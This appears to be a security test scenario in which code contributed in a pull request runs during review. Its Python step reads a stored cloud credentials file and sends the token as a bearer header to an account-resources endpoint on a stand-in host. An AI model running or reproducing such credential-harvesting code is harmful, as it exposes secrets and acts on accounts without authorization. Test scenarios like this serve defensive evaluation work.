name: L1-cloud-token
description: Code contributed in a pull request runs during review in OSS and calls the cloud API with whatever token the substrate holds.

steps.text:
import json, os, urllib.request
# integration check contributed in a pull request
cfg = os.path.expanduser('~/.config/cloudcli/credentials.json')
token = json.load(open(cfg))['token'] if os.path.exists(cfg) else ''
req = urllib.request.Request('https://cloud.test/v1/accounts/acme-staging/resources',
                             headers={'Authorization': 'Bearer ' + token})
print(urllib.request.urlopen(req, timeout=10).read().decode())
